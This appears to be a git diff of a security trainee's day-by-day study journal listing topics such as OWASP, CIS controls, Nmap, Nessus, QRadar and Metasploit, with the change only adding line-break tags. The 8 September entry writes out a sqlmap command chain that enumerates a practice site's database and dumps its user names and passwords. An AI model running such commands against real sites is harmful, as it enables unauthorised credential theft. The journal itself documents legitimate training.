@@ -1,15 +1,15 @@
 # day-day Journal
 
 --------------------------Week-1--------------------------
-<22 August> 10 Hackers and their accomplishments.
-<23 August> what vulnerabilities are available for a perticular port.
-<24 August> OWASP top 5 vulnerabilities and test it on a website.
-<25 August> How Servers Work understanding web app attack what is a attack? Plot vulnerabilities other than OWASP top 10
+<22 August> 10 Hackers and their accomplishments. <br>
+<23 August> what vulnerabilities are available for a perticular port.<br>
+<24 August> OWASP top 5 vulnerabilities and test it on a website.<br>
+<25 August> How Servers Work understanding web app attack what is a attack? Plot vulnerabilities other than OWASP top 10<br>
 
-<26-27 Aug> Exploit OWASP top 10
+<26-27 Aug> Exploit OWASP top 10<br>
 ----------------------------------------------------
 --------------------------Week-2--------------------------
-<28 August> 10 web Server Attacks
+<28 August> 10 web Server Attacks<br>
 <29 August> 
 Inventory and Control of Hardware Assets
 Inventory and Control of Software Assets
@@ -30,32 +30,32 @@ Account Monitoring and Control Organizational
 Implement a Security Awareness and Training Program
 Application Software Security
 Incident Response and Management
-Penetration Tests and Red Team Exercises
-<30 August> Understanding CIS Policy version 7and write about them
+Penetration Tests and Red Team Exercises<br>
+<30 August> Understanding CIS Policy version 7and write about them<br>
 
-<31 August> OFF DAY
+<31 August> OFF DAY<br>
 
-<1 September> Passive Reconnisence of a website without pinging it. What is OSNIT framework?
+<1 September> Passive Reconnisence of a website without pinging it. What is OSNIT framework?<br>
 
---<2-3 September> Use 10 tools on kali available in the menu section.
+--<2-3 September> Use 10 tools on kali available in the menu section.<br>
 ----------------------------------------------------
 --------------------------Week-3--------------------------
-<4 September> Scan any website to check the vulnerabilities in the website using nessus and make a report on it
-<5 September> Explore cheatsheet commands(Go through Nmap) and memorize the port nos
+<4 September> Scan any website to check the vulnerabilities in the website using nessus and make a report on it<br>
+<5 September> Explore cheatsheet commands(Go through Nmap) and memorize the port nos<br>
 
-<6 September> OFF DAY
+<6 September> OFF DAY<br>
 
-* <7 September>
+<7 September><br>
 <8 September> sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -dbs | sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables | sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns | sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C uname --dump
-sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump  [vulweb using sqlmap]
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump  [vulweb using sqlmap]<br>
 
 
 *--<9-10 September> 
 ----------------------------------------------------
 --------------------------Week-4--------------------------
-<11 September> Doccumntation on What is Syn and SEIM.
-<12 September> Doccumentation on What is wincollect and StandAlone winollect
-<13 September> pick 4-5 logs from ibm qradar and doccument business impact. What is Local Security Policy in windows.
-<14 September> 3 Vulnerabilities exploitaion on metasploit
-<15 September> Doccumentation on burpsuit
+<11 September> Doccumntation on What is Syn and SEIM.<br>
+<12 September> Doccumentation on What is wincollect and StandAlone winollect<br>
+<13 September> pick 4-5 logs from ibm qradar and doccument business impact. What is Local Security Policy in windows.<br>
+<14 September> 3 Vulnerabilities exploitaion on metasploit<br>
+<15 September> Doccumentation on burpsuit<br>
 ----------------------------------------------------
